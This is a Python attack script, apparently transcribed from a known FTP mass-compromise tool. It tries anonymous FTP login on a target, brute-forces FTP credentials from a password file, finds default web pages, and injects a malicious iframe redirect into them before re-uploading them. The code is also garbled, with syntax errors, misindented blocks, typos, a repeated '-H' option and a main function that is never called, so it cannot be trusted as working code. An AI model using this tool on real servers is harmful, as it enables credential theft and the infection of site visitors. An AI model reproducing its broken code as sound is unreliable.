import ftplib
import optparse
import time

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous','me@your.com')
        print('\n[*]' + str(hostname) + \
            'FTP Anonymous login succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-]' + str(hostname) +\
            'FTP Anonymous login failed')
        return False
    
def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        time.sleep(1)
        userName = line.split('.')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
    print('[+] Trying:' + userName +"/" + passWord)

    try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*]' + str(hostname) +\
                "FTP login Succeeded: " + userName+ '/' + passWord)
            
            ftp.quit()

            return(userName, passWord)
        except Exception as e:
            pass

        print('\n[-]Could not brute force FTP credentials')
        return(None, None)

def returnDefault(ftp):
    try;
        dirList = ftp.nlst()
        print('[-] Could not list directory contents')
        print('[-] Skipping to Next target')
        return
    retList = []
    
    for fileName in dirList:
        fn = fileName.lower()

        if '.php' in fn or '.html' in fn or '.asp' in fn:
            print('[+] Found default page: ' + fileName)
        retList.append(fileName)
    return retList

def injectPage(ftp,page,redirect):
    f = open(page + 'tmp', 'w')
    ftp.readlines('RETR' + page,f.write)

    print('[+] Downloaded Page: ' + page)

    f.write(redirect)
    f.close()
    print('[+] Injected Malicious IFrame on: ' + page)

    ftp.storlines('STOR' + page, open(page + 'tmp'))
    print('[+] Uploaded Injected Page' + page)

def attack(username, password, tgtHost, redirect):
    ftp = ftplib.FTP(tgtHost)

    ftp.login(unsername, password)

    defPages = returnDefault(ftp)

    for defPage in defPages:
         injectPage(ftp, defPage, redirect)

def main():
    parser = optparse.OptionParser('usage%prog' +\
        '-H <target host[s]> -r <redirect page>' +\
            '[-f <userpass file]')
    
    parser.add_option('-H', dest='tgtHost',\ 
        type='string', help='specify target host')
    
    parser.add_option('-H', dest='passwdFile',\ 
        type='string', help='specify user/password file')
    
    parser.add_option('-H', dest='redirect',\ 
        type='string', help='specify a redirection page')
    
        (options, args) = parser.parse_args()
    
    tgtHost = str(options.tgtHost).split(',')
    passwdFile = options.passwdFile
    redirect = options.redirect

    


host = '10.0.2.13'
anonLogin(host)